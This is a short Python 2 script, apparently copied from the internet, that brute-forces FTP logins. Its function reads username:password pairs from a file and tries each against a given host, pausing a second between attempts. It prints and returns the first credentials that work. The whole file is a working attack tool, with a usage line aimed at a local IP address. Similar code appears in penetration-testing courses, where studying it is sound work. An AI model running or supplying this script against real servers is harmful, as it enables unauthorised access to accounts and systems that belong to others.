#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
from Internet
'''
# -*- coding: utf-8 -*-
'''
usage
    import ftpbrute
    ftpbrute.ftpbrute('192.168.1.12', 'userpass.txt')
'''

import ftplib
import time

def ftpbrute(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: "+userName+"/"+passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) +\
          ' FTP Logon Succeeded: '+userName+"/"+passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)



